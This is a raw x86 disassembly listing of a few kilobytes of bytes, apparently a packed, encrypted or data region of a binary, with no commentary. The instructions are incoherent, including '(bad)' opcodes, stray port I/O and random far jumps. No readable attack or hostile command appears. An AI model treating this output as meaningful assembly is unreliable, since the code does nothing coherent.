  40b864:	fisub  WORD PTR [ecx+0x786d0b4b]
  40b86a:	xchg   esi,eax
  40b86c:	sti    
  40b86d:	imul   esi,DWORD PTR [ebx-0x216dbff7],0x50
  40b874:	inc    esi
  40b875:	inc    ebp
  40b876:	jecxz  0x40b804
  40b878:	add    BYTE PTR [edi+0x57],0xbc
  40b87c:	jns    0x40b8ab
  40b87e:	aam    0x36
  40b880:	test   BYTE PTR [ecx+0x6e2d320d],0x7b
  40b887:	and    BYTE PTR [ecx],0x72
  40b88a:	pop    ebp
  40b88b:	int3   
  40b88c:	jns    0x40b846
  40b88e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b890:	xchg   ebp,eax
  40b891:	push   ebp
  40b892:	(bad)  
  40b893:	fsub   DWORD PTR [edx]
  40b895:	scas   eax,DWORD PTR es:[edi]
  40b896:	jg     0x40b8c3
  40b898:	out    0x98,eax
  40b89a:	xchg   ebp,eax
  40b89b:	icebp  
  40b89c:	adc    eax,0x1b668fb1
  40b8a1:	mov    WORD PTR [esi],?
  40b8a3:	out    dx,eax
  40b8a4:	jecxz  0x40b8ce
  40b8a6:	mov    bh,0x8e
  40b8a8:	mov    ecx,esp
  40b8aa:	adc    al,0xe5
  40b8ac:	mov    esp,0xf2c09b65
  40b8b1:	pop    esi
  40b8b2:	push   ebp
  40b8b3:	fimul  WORD PTR [eax+0x5001d15d]
  40b8b9:	jg     0x40b8b7
  40b8bb:	hlt    
  40b8bc:	mov    bh,0x9
  40b8be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8bf:	frstor [ebp-0x5f]
  40b8c2:	jo     0x40b93e
  40b8c4:	push   cs
  40b8c5:	push   esi
  40b8c6:	loope  0x40b85e
  40b8c8:	lods   eax,DWORD PTR ds:[esi]
  40b8c9:	popa   
  40b8ca:	jp     0x40b935
  40b8cc:	cmp    DWORD PTR [eax],eax
  40b8ce:	fisttp QWORD PTR [ebx+0x8e921e0]
  40b8d4:	pop    es
  40b8d5:	jbe    0x40b8bd
  40b8d7:	add    BYTE PTR [edi],al
  40b8d9:	mov    edi,0xef727f08
  40b8de:	outs   dx,BYTE PTR ds:[esi]
  40b8df:	jmp    FWORD PTR [edx]
  40b8e1:	mov    eax,0x37ac87dd
  40b8e6:	sub    DWORD PTR [eax-0x2febc873],esi
  40b8ec:	(bad)  
  40b8ed:	test   DWORD PTR [edi+esi*1+0x46],0x8aa75854
  40b8f5:	mov    al,ds:0x6b2a9885
  40b8fa:	add    al,0x60
  40b8fc:	jb     0x40b97b
  40b8fe:	pop    ds
  40b8ff:	mov    WORD PTR [ebx+0x68],ds
  40b902:	fstp   TBYTE PTR [esi+0x51be96e1]
  40b908:	inc    ecx
  40b909:	out    0x40,eax
  40b90b:	mov    cl,0x2a
  40b90d:	add    DWORD PTR [eax],ebp
  40b90f:	js     0x40b98e
  40b911:	push   ds
  40b912:	jl     0x40b93a
  40b914:	jbe    0x40b965
  40b916:	cwde   
  40b917:	arpl   WORD PTR [edx+0x1a58fcb3],si
  40b91d:	rcr    BYTE PTR [eax+0x5e8561e0],cl
  40b923:	mov    esi,0xe1bcfd96
  40b928:	pop    esi
  40b929:	pop    ebx
  40b92a:	out    dx,eax
  40b92b:	mov    al,ss:0xa8f1b839
  40b931:	mov    bh,BYTE PTR [edx]
  40b933:	sbb    eax,0x3d6500eb
  40b938:	dec    ecx
  40b939:	adc    bl,BYTE PTR [edx+eiz*2]
  40b93c:	pushf  
  40b93d:	rol    ebx,1
  40b93f:	ror    esp,0x74
  40b942:	out    0x66,al
  40b944:	fisub  DWORD PTR [esi+0xa]
  40b947:	ja     0x40b953
  40b949:	jns    0x40b8e3
  40b94b:	mov    ch,0x19
  40b94d:	adc    eax,0x28ccbfbe
  40b952:	je     0x40b92f
  40b954:	xor    BYTE PTR [edx+0x44],0xd8
  40b958:	push   0xfffffff0
  40b95a:	mov    fs,WORD PTR [ecx-0x2de7150]
  40b960:	adc    al,BYTE PTR [edx-0x5a]
  40b963:	xchg   edx,eax
  40b964:	pusha  
  40b965:	js     0x40b941
  40b967:	cmp    esi,DWORD PTR [eax+eax*4+0x34]
  40b96b:	or     BYTE PTR [edi-0x59ef5103],bh
  40b971:	out    0x7,al
  40b973:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b975:	or     al,0xf
  40b977:	outs   dx,BYTE PTR ds:[esi]
  40b978:	and    al,0x94
  40b97a:	inc    ecx
  40b97b:	add    dl,BYTE PTR [edi+0x22c6835c]
  40b981:	icebp  
  40b982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b983:	cmp    al,0x4d
  40b985:	inc    eax
  40b986:	dec    edi
  40b987:	daa    
  40b988:	out    0x6,eax
  40b98a:	add    DWORD PTR [eax],0xffffffe8
  40b98d:	mov    al,0x55
  40b98f:	enter  0x5884,0xbf
  40b993:	mov    ebp,0x3465b0d9
  40b998:	xor    edx,DWORD PTR [esi+eax*8-0x17]
  40b99c:	add    eax,0xf005eda9
  40b9a1:	xor    eax,0x914db9a
  40b9a6:	nop
  40b9a7:	fcos   
  40b9a9:	pop    esi
  40b9aa:	push   ebx
  40b9ab:	addr16 push esi
  40b9ad:	call   0x327f0de5
  40b9b2:	and    DWORD PTR [ebx+ebp*8+0x491d2f5],ebp
  40b9b9:	mov    eax,0x9498b5da
  40b9be:	scas   eax,DWORD PTR es:[edi]
  40b9bf:	inc    ecx
  40b9c0:	imul   ebx,DWORD PTR [ecx+0x8010102],0xa4ca5f7e
  40b9ca:	mov    ebx,0x853eacd2
  40b9cf:	jecxz  0x40b9ba
  40b9d1:	dec    ebx
  40b9d2:	mov    al,ds:0x71df4975
  40b9d7:	add    BYTE PTR [esi],al
  40b9d9:	popf   
  40b9da:	dec    edi
  40b9db:	stc    
  40b9dc:	call   0xada0304
  40b9e1:	fisub  DWORD PTR [edi]
  40b9e3:	jl     0x40b98c
  40b9e5:	or     DWORD PTR [eax],ebp
  40b9e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9e8:	push   es
  40b9e9:	stc    
  40b9ea:	push   cs
  40b9eb:	xchg   esi,eax
  40b9ec:	aas    
  40b9ed:	jo     0x40b9d0
  40b9ef:	and    ch,BYTE PTR [ecx-0x687580df]
  40b9f5:	dec    edx
  40b9f6:	ret    
  40b9f7:	js     0x40b9bc
  40b9f9:	jne    0x40ba44
  40b9fb:	shl    DWORD PTR ds:0x1d57fbcf,1
  40ba01:	retf   
  40ba02:	xor    dl,BYTE PTR [edx+0x36]
  40ba05:	test   BYTE PTR [ebp+0x53],dl
  40ba08:	push   esi
  40ba09:	loop   0x40b995
  40ba0b:	dec    ecx
  40ba0c:	rol    BYTE PTR [eax+eax*1],cl
  40ba0f:	test   al,0xef
  40ba11:	push   0xb
  40ba13:	cwde   
  40ba14:	inc    esi
  40ba15:	psrad  mm5,QWORD PTR [ecx]
  40ba18:	inc    ebp
  40ba19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba1a:	shl    DWORD PTR [ebx-0x44],0xa0
  40ba1e:	or     eax,0x8e80a641
  40ba23:	es (bad) 
  40ba25:	xor    eax,0xfc210f01
  40ba2a:	mov    eax,DWORD PTR [esi-0x47]
  40ba2d:	into   
  40ba2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba2f:	pop    DWORD PTR [ebp+ebp*8-0x75ba5c0c]
  40ba36:	ins    BYTE PTR es:[edi],dx
  40ba37:	adc    al,0x82
  40ba39:	push   ss
  40ba3a:	iret   
  40ba3b:	or     DWORD PTR [eax+0x75],edx
  40ba3e:	push   ebx
  40ba3f:	push   ebx
  40ba40:	cdq    
  40ba41:	inc    edi
  40ba42:	icebp  
  40ba43:	retf   0xaa2e
  40ba46:	lods   eax,DWORD PTR ds:[esi]
  40ba47:	lea    ecx,[ecx+0x9]
  40ba4a:	inc    eax
  40ba4b:	add    al,0x58
  40ba4d:	pop    esp
  40ba4e:	test   al,0xbf
  40ba50:	das    
  40ba51:	in     al,0x6a
  40ba53:	jp     0x40ba0a
  40ba55:	stos   BYTE PTR es:[edi],al
  40ba56:	add    bh,BYTE PTR [edi]
  40ba58:	ldmxcsr DWORD PTR [ebp+0x7e1b5d00]
  40ba5f:	pop    ds
  40ba60:	inc    edi
  40ba61:	xor    cl,BYTE PTR [eax-0xe12ee5c]
  40ba67:	cli    
  40ba68:	xor    BYTE PTR [ebp-0x3b112782],ah
  40ba6e:	aaa    
  40ba6f:	jns    0x40ba95
  40ba71:	orps   xmm4,xmm2
  40ba74:	or     bh,BYTE PTR [esi]
  40ba76:	rcr    dh,0x7b
  40ba79:	jns    0x40baf8
  40ba7b:	inc    edi
  40ba7c:	inc    eax
  40ba7d:	add    eax,0x53e8bbf3
  40ba82:	mov    ecx,0x8669627c
  40ba87:	inc    edi
  40ba88:	ret    
  40ba89:	popf   
  40ba8a:	ficom  DWORD PTR [edx+0x1]
  40ba8d:	jl     0x40bad4
  40ba8f:	and    edi,esp
  40ba91:	push   esp
  40ba92:	ret    
  40ba93:	jge    0x40bab5
  40ba95:	in     al,0xb3
  40ba97:	xchg   ebp,eax
  40ba98:	rcl    BYTE PTR [ebp-0x5db96364],1
  40ba9e:	in     eax,0x50
  40baa0:	retf   
  40baa1:	pop    ss
  40baa2:	xchg   di,ax
  40baa4:	data16 or al,ch
  40baa7:	ret    0xba77
  40baaa:	lds    esp,FWORD PTR [ecx+ecx*4+0x5233728f]
  40bab1:	jae    0x40bb12
  40bab3:	arpl   WORD PTR [esp+edx*8],di
  40bab6:	and    ebp,DWORD PTR [edx-0x37d6f9ae]
  40babc:	add    eax,0x105323a5
  40bac1:	push   cs
  40bac2:	test   eax,0x704213f7
  40bac7:	mov    dh,0x64
  40bac9:	mov    dh,0x8
  40bacb:	dec    esp
  40bacc:	cmp    ebp,DWORD PTR [edx]
  40bace:	adc    edx,ecx
  40bad0:	sar    BYTE PTR [ebx],0x14
  40bad3:	cmp    eax,0xba23a13e
  40bad8:	cld    
  40bad9:	push   eax
  40bada:	xor    al,BYTE PTR [esi]
  40badc:	out    0x57,al
  40bade:	in     al,dx
  40badf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae0:	popf   
  40bae1:	test   DWORD PTR [edi],ebp
  40bae3:	ins    BYTE PTR es:[edi],dx
  40bae4:	push   edx
  40bae5:	aad    0xb5
  40bae7:	dec    esi
  40bae8:	jmp    0xfe52:0xe27ebec9
  40baef:	sub    edx,DWORD PTR [ecx+0x7e]
  40baf2:	mov    BYTE PTR [ebx-0x12eb4ebd],ah
  40baf8:	bound  edi,QWORD PTR [ecx]
  40bafa:	stos   BYTE PTR es:[edi],al
  40bafb:	inc    ecx
  40bafc:	mov    al,0xba
  40bafe:	int3   
  40baff:	push   ebx
  40bb00:	ins    BYTE PTR es:[edi],dx
  40bb01:	loope  0x40ba98
  40bb03:	cwde   
  40bb04:	xchg   esp,eax
  40bb05:	adc    ebx,DWORD PTR [ecx-0x1624ee7c]
  40bb0b:	nop
  40bb0c:	rol    BYTE PTR [esi],0xd2
  40bb0f:	in     eax,0x8
  40bb11:	xchg   ebp,eax
  40bb12:	and    cl,0xde
  40bb15:	ins    DWORD PTR es:[edi],dx
  40bb16:	repnz add eax,0x8f5aa18e
  40bb1c:	sbb    eax,0xb0b6a466
  40bb21:	pop    es
  40bb22:	fcom   st(4)
  40bb24:	sub    al,0x59
  40bb26:	or     bh,BYTE PTR [ecx+ebp*1+0x5f9fd18f]
  40bb2d:	test   al,0x4b
  40bb2f:	jg     0x40bb8d
  40bb31:	ins    DWORD PTR es:[edi],dx
  40bb32:	mov    al,0xb2
  40bb34:	fstp   DWORD PTR [ebx-0x39fccecb]
  40bb3a:	in     al,dx
  40bb3b:	mov    ebx,0x2463464
  40bb40:	dec    esp
  40bb41:	sub    ch,ah
  40bb43:	not    DWORD PTR [edi]
  40bb45:	retf   
  40bb46:	mov    edx,0xe7292a83
  40bb4b:	mov    bl,0x3f
  40bb4d:	lahf   
  40bb4e:	and    BYTE PTR [ebp-0x17b0e9d9],ah
  40bb54:	iret   
  40bb55:	lods   eax,DWORD PTR ds:[esi]
  40bb56:	add    al,0x65
  40bb58:	out    0x7,eax
  40bb5a:	mov    ebp,0x97cd7fc
  40bb5f:	adc    BYTE PTR [eax-0x22],ch
  40bb62:	std    
  40bb63:	out    dx,eax
  40bb64:	adc    eax,DWORD PTR [edi+esi*4-0x1b]
  40bb68:	or     edi,DWORD PTR [ebx+0x6a]
  40bb6b:	scas   eax,DWORD PTR es:[edi]
  40bb6c:	mov    edx,0xab6a30d0
  40bb71:	pop    edi
  40bb72:	push   ds
  40bb73:	push   edx
  40bb74:	mov    bl,BYTE PTR [ebp-0x14]
  40bb77:	sti    
  40bb78:	push   0x7311617e
  40bb7d:	out    0x4,eax
  40bb7f:	test   BYTE PTR [esi+0x3823f97a],0x92
  40bb86:	sar    ecx,0x29
  40bb89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb8a:	nop
  40bb8b:	in     eax,0x98
  40bb8d:	aaa    
  40bb8e:	pop    ss
  40bb8f:	push   ds
  40bb90:	std    
  40bb91:	and    al,BYTE PTR [ecx]
  40bb93:	in     eax,0x24
  40bb95:	fdivr  st,st(4)
  40bb97:	jecxz  0x40bb83
  40bb99:	loope  0x40bb7c
  40bb9b:	repz dec ecx
  40bb9d:	and    edi,edi
  40bb9f:	xchg   edx,eax
  40bba0:	xor    al,bh
  40bba2:	mov    eax,0xd9b66502
  40bba7:	adc    edi,ebp
  40bba9:	xor    eax,0xe76a72d2
  40bbae:	lea    edi,[eax-0x1d]
  40bbb1:	mov    fs,WORD PTR [esi]
  40bbb3:	jno    0x40bbcb
  40bbb5:	xchg   edx,eax
  40bbb6:	int    0x3a
  40bbb8:	repz shr BYTE PTR ds:0xa658800d,1
  40bbbf:	push   0x9
  40bbc1:	ret    0x3493
  40bbc4:	mov    cl,BYTE PTR [eax-0x80]
  40bbc7:	out    dx,al
  40bbc8:	push   es
  40bbc9:	mov    edi,0xfca75db7
  40bbce:	neg    DWORD PTR ds:[esi+esi*2+0x34a06bb9]
  40bbd6:	and    ch,cl
  40bbd8:	popf   
  40bbd9:	int3   
  40bbda:	push   0xffffffa7
  40bbdc:	mov    BYTE PTR [esi],0xe6
  40bbdf:	das    
  40bbe0:	inc    edi
  40bbe1:	sub    bl,0x7b
  40bbe4:	ss jp  0x40bbf5
  40bbe7:	xlat   BYTE PTR ds:[ebx]
  40bbe8:	push   esp
  40bbe9:	dec    eax
  40bbea:	and    al,0x69
  40bbec:	shr    BYTE PTR [eax-0x4d9305af],cl
  40bbf2:	retf   
  40bbf3:	out    0x5b,eax
  40bbf5:	in     al,dx
  40bbf6:	les    eax,FWORD PTR [ebx]
  40bbf8:	mov    edi,0x2ed8263e
  40bbfd:	in     eax,0x5d
  40bbff:	clc    
  40bc00:	fwait
  40bc01:	inc    esp
  40bc02:	call   0xc1309982
  40bc07:	jne    0x40bbdd
  40bc09:	add    BYTE PTR [ecx+0x1c890cd5],al
  40bc0f:	shl    DWORD PTR [edx+ecx*1+0xc],cl
  40bc13:	inc    edi
  40bc14:	cmp    BYTE PTR [edi-0xdb740d3],al
  40bc1a:	pop    eax
  40bc1b:	jle    0x40bc58
  40bc1d:	call   0xca32:0x93c9060b
  40bc24:	pop    ebx
  40bc25:	leave  
  40bc26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc27:	pop    ds
  40bc28:	in     eax,dx
  40bc29:	fs xor eax,0xba31bc37
  40bc2f:	fcom   QWORD PTR [esi+eiz*4+0x16ea52a]
  40bc36:	jnp    0x40bc4b
  40bc38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc39:	cmc    
  40bc3a:	add    BYTE PTR [ebx+ecx*4],dl
  40bc3d:	loopne 0x40bc21
  40bc3f:	jae    0x40bc8f
  40bc41:	outs   dx,DWORD PTR ds:[esi]
  40bc42:	sbb    DWORD PTR [ebx],esi
  40bc44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc45:	jg     0x40bcba
  40bc47:	sbb    ebp,DWORD PTR [ecx-0x65e12bec]
  40bc4d:	adc    al,0x79
  40bc4f:	out    dx,eax
  40bc50:	push   eax
  40bc51:	mov    bh,0x6f
  40bc53:	inc    edx
  40bc54:	ss imul ebp,ebx,0xffffff90
  40bc58:	add    al,BYTE PTR [ecx]
  40bc5a:	aam    0xac
  40bc5c:	jbe    0x40bcdd
  40bc5e:	out    0xa5,al
  40bc60:	ja     0x40bcac
  40bc62:	or     BYTE PTR [ebx],0x37
  40bc65:	mov    eax,0x261cc3a3
  40bc6a:	jne    0x40bcb1
  40bc6c:	maxps  xmm5,XMMWORD PTR [ebx+0x1b46f81]
  40bc73:	dec    ebp
  40bc74:	jp     0x40bc3a
  40bc76:	or     eax,0x7f789a7e
  40bc7b:	xchg   ebp,eax
  40bc7c:	out    0x9a,eax
  40bc7e:	dec    esi
  40bc7f:	sub    ebx,esi
  40bc81:	jmp    0x40bc0f
  40bc83:	rcr    BYTE PTR [ebp+0x1e],cl
  40bc86:	cdq    
  40bc87:	pop    ebx
  40bc88:	in     al,0x1e
  40bc8a:	ret    
  40bc8b:	inc    ebx
  40bc8c:	xchg   BYTE PTR [esi+0x278dffb8],bh
  40bc92:	div    edx
  40bc94:	cdq    
  40bc95:	jmp    0x2538:0x5a98f8f9
  40bc9c:	push   ds
  40bc9d:	xchg   ebx,eax
  40bc9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9f:	cmp    ebp,DWORD PTR [edi]
  40bca1:	pop    esp
  40bca2:	retf   
  40bca3:	mov    edx,0x6be81126
  40bca8:	adc    DWORD PTR [edx],edx
  40bcaa:	or     BYTE PTR [eax+edi*2],ch
  40bcad:	mov    bl,0xbb
  40bcaf:	in     al,0xcb
  40bcb1:	fidiv  WORD PTR [edx]
  40bcb3:	mov    esp,0x6a9c5690
  40bcb8:	pop    edx
  40bcb9:	aaa    
  40bcba:	add    ebp,0xffffffd9
  40bcbd:	es xchg edx,eax
  40bcbf:	ja     0x40bcde
  40bcc1:	and    esp,ebx
  40bcc3:	inc    ebp
  40bcc4:	or     edx,ebx
  40bcc6:	and    al,0x7
  40bcc8:	in     eax,dx
  40bcc9:	sahf   
  40bcca:	xchg   ebp,eax
  40bccb:	sbb    eax,0xfb045392
  40bcd0:	std    
  40bcd1:	jg     0x40bd35
  40bcd3:	ds daa 
  40bcd5:	sub    eax,0xcf1e3d7a
  40bcda:	and    al,0x63
  40bcdc:	ins    BYTE PTR es:[edi],dx
  40bcdd:	cmp    bl,BYTE PTR [edx+ebp*2+0x6987ff3d]
  40bce4:	mov    al,ds:0x5a009d60
  40bce9:	daa    
  40bcea:	adc    ebp,esp
  40bcec:	test   eax,0x308edf1e
  40bcf1:	mov    bl,0x36
  40bcf3:	mov    bh,0x2e
  40bcf5:	pop    ds
  40bcf6:	(bad)  
  40bcf7:	pop    esi
  40bcf8:	sbb    al,BYTE PTR [ebx-0xe]
  40bcfb:	aas    
  40bcfc:	cs jno 0x40bca0
  40bcff:	pop    ss
  40bd00:	leave  
  40bd01:	add    dh,al
  40bd03:	inc    ecx
  40bd04:	lods   al,BYTE PTR ds:[esi]
  40bd05:	and    eax,0x99a2f5b7
  40bd0a:	addr16 call 0x456c89c
  40bd10:	mov    bh,0x89
  40bd12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd13:	push   ebp
  40bd14:	cwde   
  40bd15:	dec    eax
  40bd16:	mov    bl,0x65
  40bd18:	mov    DWORD PTR [ebp-0x72],0x2c873ba0
  40bd1f:	adc    BYTE PTR [ebx],0xb5
  40bd22:	cdq    
  40bd23:	rol    BYTE PTR [edi-0x72],0x5a
  40bd27:	mov    ebp,DWORD PTR ss:[ebp-0x35]
  40bd2b:	sbb    al,0x19
  40bd2d:	iret   
  40bd2e:	sub    ebp,edi
  40bd30:	cmp    eax,DWORD PTR [edi+0x68]
  40bd33:	add    ebx,DWORD PTR [esi]
  40bd35:	push   ebx
  40bd36:	out    dx,al
  40bd37:	pop    ds
  40bd38:	adc    DWORD PTR [esi],eax
  40bd3a:	imul   eax,DWORD PTR [edx],0xffffffc3
  40bd3d:	rcr    BYTE PTR [ecx+0x47ede194],1
  40bd43:	dec    edi
  40bd44:	test   al,0xa6
  40bd46:	outs   dx,DWORD PTR ds:[esi]
  40bd47:	and    BYTE PTR [esi+ebp*1-0x75],dh
  40bd4b:	in     al,dx
  40bd4c:	ret    0xb03f
  40bd4f:	call   0x2e9d:0x6e73e6bd
  40bd56:	xchg   edi,eax
  40bd57:	dec    esp
  40bd58:	push   0x13
  40bd5a:	mov    ds:0x7184fd92,al
  40bd5f:	xor    BYTE PTR [ebx+ecx*1-0x1c],cl
  40bd63:	adc    al,0xee
  40bd65:	inc    eax
  40bd66:	lods   al,BYTE PTR ds:[esi]
  40bd67:	sti    
  40bd68:	sbb    bh,BYTE PTR [esi-0x62f423e9]
  40bd6e:	rol    DWORD PTR [edx],0xb9
  40bd71:	xchg   DWORD PTR [ecx],ecx
  40bd73:	gs cld 
  40bd75:	pop    edi
  40bd76:	rol    BYTE PTR [edx],1
  40bd78:	adc    esp,DWORD PTR [esi+0x62d8319]
  40bd7e:	add    BYTE PTR [eax-0x15751a4f],bh
  40bd84:	xchg   ebp,eax
  40bd85:	jbe    0x40bd85
  40bd87:	sbb    esi,DWORD PTR [eax+0x71f19fe9]
  40bd8d:	sahf   
  40bd8e:	lock mov al,0xfc
  40bd91:	jnp    0x40bd97
  40bd93:	fisub  DWORD PTR [ebx-0x55]
  40bd96:	mov    al,ds:0x27af5804
  40bd9b:	out    dx,eax
  40bd9c:	iret   
  40bd9d:	sbb    ah,BYTE PTR [edi+0x3d]
  40bda0:	jo     0x40bd9f
  40bda2:	js     0x40be0c
  40bda4:	push   esp
  40bda5:	mov    cl,dh
  40bda7:	stos   DWORD PTR es:[edi],eax
  40bda8:	lahf   
  40bda9:	adc    ch,dh
  40bdab:	fs js  0x40bdae
  40bdae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdaf:	mov    al,ds:0x4906fd1d
  40bdb4:	pop    ds
  40bdb5:	xchg   ebx,eax
  40bdb6:	mov    dl,0x5a
  40bdb8:	repz cmp al,0x2f
  40bdbb:	jne    0x40bdcf
  40bdbd:	and    al,al
  40bdbf:	push   eax
  40bdc0:	cmp    al,0x69
  40bdc2:	loopne 0x40bde5
  40bdc4:	dec    ebp
  40bdc5:	hlt    
  40bdc6:	xlat   BYTE PTR ds:[ebx]
  40bdc7:	(bad)
  40bdcc:	or     BYTE PTR [ecx-0x45],0xe8
  40bdd0:	into   
  40bdd1:	pop    edx
  40bdd2:	sub    DWORD PTR [eax+0x20],eax
  40bdd5:	in     eax,0x0
  40bdd7:	mov    cs,WORD PTR [edx-0x13d4b4cd]
  40bddd:	adc    al,0xa
  40bddf:	sbb    DWORD PTR [edi],edi
  40bde1:	adc    DWORD PTR [ebp-0x66ffe8b5],ebp
  40bde7:	ds dec edi
  40bde9:	sti    
  40bdea:	mov    ds:0xe61ac422,eax
  40bdef:	push   cs
  40bdf0:	jbe    0x40bdd9
  40bdf2:	das    
  40bdf3:	mov    cl,0xe3
  40bdf5:	mov    WORD PTR [ebx+0x6665906a],?
  40bdfb:	rol    DWORD PTR [ebx-0x4fa9b38d],0xac
  40be02:	jp     0x40be10
  40be04:	cmp    ecx,esp
  40be06:	inc    DWORD PTR [esi+ebp*8+0x358d204]
  40be0d:	lds    esp,FWORD PTR [eax]
  40be0f:	mov    ?,WORD PTR [esi+0x5beec4e6]
  40be15:	mov    ecx,0xf1364483
  40be1a:	rol    DWORD PTR [edi],cl
  40be1c:	xchg   BYTE PTR [edi+0x60],cl
  40be1f:	dec    esi
  40be20:	ds adc al,0xe9
  40be23:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40be25:	push   0x60
  40be27:	sub    BYTE PTR [esp+ecx*2],dh
  40be2a:	mov    WORD PTR [esi],ds
  40be2c:	push   ecx
  40be2d:	inc    edi
  40be2e:	shl    BYTE PTR [ebx-0x2b],1
  40be31:	imul   ebp,DWORD PTR [ebp-0x54b9bc52],0xffffff96
  40be38:	inc    eax
  40be39:	xor    BYTE PTR ds:0x67bfad32,al
  40be3f:	push   edx
  40be40:	xchg   ebx,ebp
  40be42:	mov    BYTE PTR [eax],dh
  40be44:	out    0x98,eax
  40be46:	stos   BYTE PTR es:[edi],al
  40be47:	sti    
  40be48:	in     eax,dx
  40be49:	(bad)  
  40be4a:	jne    0x40be6c
  40be4c:	mov    dl,0x79
  40be4e:	mov    dl,0xba
  40be50:	add    BYTE PTR [esi+0x79],ah
  40be53:	mov    eax,ds:0x58694771
  40be58:	sub    BYTE PTR [ecx+0x39e0c608],0xd1
  40be5f:	out    dx,al
  40be60:	call   0x1d7c:0x2b8efb8c
  40be67:	call   0xe1593a2d
  40be6c:	cli    
  40be6d:	jo     0x40beb1
  40be6f:	and    cl,BYTE PTR [esi]
  40be71:	dec    esi
  40be72:	cmc    
  40be73:	pop    ebp
  40be74:	jl     0x40be38
  40be76:	popa   
  40be77:	stos   BYTE PTR es:[edi],al
  40be78:	int    0xc9
  40be7a:	mov    ah,0x18
  40be7c:	pop    ss
  40be7d:	rcl    ch,cl
  40be7f:	mov    al,ds:0x3bd126f2
  40be84:	add    edx,ecx
  40be86:	je     0x40be27
  40be88:	outs   dx,DWORD PTR ds:[esi]
  40be89:	jmp    0x645e:0x5ce5b7c4
  40be90:	lea    eax,[edi-0xb]
  40be93:	inc    ebx
  40be94:	dec    ebx
  40be95:	les    edx,FWORD PTR [ecx-0x79121695]
  40be9b:	test   eax,0x823a059c
  40bea0:	dec    edx
  40bea1:	scas   eax,DWORD PTR es:[di]
  40bea3:	and    dl,BYTE PTR [ecx]
  40bea5:	push   edx
  40bea6:	ins    BYTE PTR es:[edi],dx
  40bea7:	loopne 0x40be73
  40bea9:	out    0x25,al
  40beab:	adc    eax,0x854cc9eb
  40beb1:	ja     0x40be77
  40beb3:	mov    edi,0x46b90510
  40beb8:	rcr    BYTE PTR [esi-0xaa0fb0a],cl
  40bebe:	fld    TBYTE PTR ds:0xd7167074
  40bec4:	lods   al,BYTE PTR ds:[esi]
  40bec5:	or     DWORD PTR [ebp-0x790f981e],0xffffffd9
  40becc:	push   edi
  40becd:	xchg   esi,eax
  40bece:	push   edi
  40becf:	call   0x7dd64152
  40bed4:	mov    cl,0x3
  40bed6:	dec    eax
  40bed7:	adc    ah,bl
  40bed9:	pusha  
  40beda:	and    al,BYTE PTR [ecx-0x780ecfed]
  40bee0:	push   0xe8df9324
  40bee5:	out    dx,al
  40bee6:	cmp    DWORD PTR [ebp-0x7ca4c3d7],ebx
  40beec:	icebp  
  40beed:	mov    dh,BYTE PTR [edi-0x24f227f4]
  40bef3:	clc    
  40bef4:	jecxz  0x40be95
  40bef6:	adc    al,0xec
  40bef8:	inc    edi
  40bef9:	push   esp
  40befa:	repz pop ss
  40befc:	cmp    eax,DWORD PTR [ebp+0x1848f4b9]
  40bf02:	jae    0x40be8d
  40bf04:	stos   BYTE PTR es:[edi],al
  40bf05:	scas   eax,DWORD PTR es:[edi]
  40bf06:	std    
  40bf07:	imul   esp,DWORD PTR [edx+0xf9827a6],0xe4ab216e
  40bf11:	ret    
  40bf12:	add    bl,BYTE PTR [edi-0x2d]
  40bf15:	cmp    dh,dh
  40bf17:	mov    ebp,0xa3124421
  40bf1c:	shl    BYTE PTR [ecx-0x4ee371bd],1
  40bf22:	push   edx
  40bf23:	shr    DWORD PTR [edi*4+0x869d4a6],0x47
  40bf2b:	cmp    ebx,DWORD PTR [ebx+0x135b7f63]
  40bf31:	sar    DWORD PTR [ecx-0x2defda60],0x53
  40bf38:	jbe    0x40bfab
  40bf3a:	test   edi,edx
  40bf3c:	ret    0x8ed7
  40bf3f:	pop    esp
  40bf40:	xor    dl,BYTE PTR [edi]
  40bf42:	cmp    al,0x57
  40bf44:	jmp    0xc4cb8f07
  40bf49:	add    esp,edi
  40bf4b:	cmp    al,0x5f
  40bf4d:	pusha  
  40bf4e:	outs   dx,BYTE PTR ds:[esi]
  40bf4f:	aam    0xae
  40bf51:	inc    ecx
  40bf52:	pop    ds
  40bf53:	mov    WORD PTR [ecx+0x7ead472c],fs
  40bf59:	fisub  WORD PTR [edi+0x2]
  40bf5c:	adc    al,0xdd
  40bf5e:	in     al,0x93
  40bf60:	call   0x1d68:0xf97a100c
  40bf67:	and    esi,esi
  40bf69:	imul   ecx,ebp,0x70
  40bf6c:	aaa    
  40bf6d:	aaa    
  40bf6e:	aaa    
  40bf6f:	ret    
  40bf70:	jmp    0xe510:0x6c1a13cc
  40bf77:	mov    bh,BYTE PTR [ebp+0x5f]
  40bf7a:	xchg   edi,eax
  40bf7b:	xor    DWORD PTR [ebp-0x4a],0x3a
  40bf7f:	jge    0x40bfc4
  40bf81:	mov    ds:0xea05517b,eax
  40bf86:	cmp    eax,DWORD PTR [ecx+0x69]
  40bf89:	js     0x40c005
  40bf8b:	(bad)  
  40bf8d:	inc    ebp
  40bf8e:	sbb    eax,0x8d5ad6a
  40bf93:	push   ss
  40bf94:	imul   ecx,DWORD PTR [ebx-0x37],0x7b
  40bf98:	or     BYTE PTR [ebx-0x7ce88842],bl
  40bf9e:	xlat   BYTE PTR ds:[ebx]
  40bf9f:	adc    edx,eax
  40bfa1:	jne    0x40bf2e
  40bfa3:	jb     0x40bf3c
  40bfa5:	lds    ecx,FWORD PTR [ecx]
  40bfa7:	xlat   BYTE PTR ds:[ebx]
  40bfa8:	iret   
